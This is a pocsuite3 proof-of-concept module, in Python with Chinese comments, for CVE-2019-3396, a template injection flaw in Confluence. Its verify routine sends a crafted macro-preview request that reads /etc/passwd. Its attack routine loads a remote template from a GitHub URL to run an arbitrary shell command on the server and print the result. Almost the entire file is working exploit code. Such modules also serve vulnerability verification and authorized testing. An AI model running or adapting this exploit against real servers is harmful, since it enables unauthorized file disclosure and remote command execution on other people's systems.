#!/usr/bin/env python
#coding=utf-8

import json
from lxml import etree
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase

class confluence_exec_poc(POCBase):
    vulID = '97898'
    version = '1.0'
    author = 'xmy'
    vulDate = ''
    createDate = '2019-04-04'
    updateDate = '2019-04-04'
    references = ['https://www.seebug.org/vuldb/ssvid-97898']
    name = 'Confluence 远程命令执行漏洞(CVE-2019-3396)'
    appPowerLink = 'https://www.atlassian.com/'
    appName = 'Confluence'
    appVersion = '6.x'
    vulType = 'Code Execution'
    desc = '''
        Confluence Server 与 Confluence Data Center 中的 Widget Connector 存在服务端模板注入漏洞，攻击者构造特定请求可远程遍历服务器任意文件，
        甚至实现远程命令执行攻击。
        '''
    samples = []
    
    def _options(self):
        opt = {}
        opt['cmd'] = OptString('', description='shell command', require=False)
        
        return opt

    def _verify(self):
        result = {}
        headers = {}
        target = self.url + '/rest/tinymce/1/macro/preview'
        payload = {'contentId':'786458','macro':{'name':'widget','body':'','params':{'url':'https://www.viddler.com/v/23464dc6','width':'1000','height':'1000','_template':'file:///etc/passwd'}}}
        referer = self.url + '/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&'
        content_type = 'application/json; charset=utf-8'
        headers['Referer'] = referer
        headers['Content-Type'] = content_type  #需要设置Content-Type，否则会显示XSRF check failed
        
        response = requests.post(target, data=json.dumps(payload), headers=headers)
        content = response.content
        poc_output = etree.HTML(content).xpath('//div[@class="wiki-content"]/text()')[0].strip()
        keyword = 'root:x:0:0:root:/root'   #/etc/passwd关键字
        if keyword in poc_output:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target
            
        return self.parse_output(result)
     
    def _attack(self):
        result = {}
        headers = {}
        target = self.url + '/rest/tinymce/1/macro/preview'
        poc_file = 'https://raw.githubusercontent.com/qlxmy/vul/master/Confluence_CVE-2019-3396/poc.rm'
        cmd = self.get_option('cmd')
        payload = {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":poc_file,"command":cmd}}}
        referer = self.url + '/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&'
        content_type = 'application/json; charset=utf-8'
        headers['Referer'] = referer
        headers['Content-Type'] = content_type  #需要设置Content-Type，否则会显示XSRF check failed
        
        response = requests.post(target, data=json.dumps(payload), headers=headers)
        content = response.content
        cmd_output = etree.HTML(content).xpath('//div[@class="wiki-content"]/text()')[0].strip()
        if cmd_output:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = target
            result['ShellInfo']['command'] = cmd
            print(cmd_output)
            
        return self.parse_output(result)
        
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
        
register_poc(confluence_exec_poc)

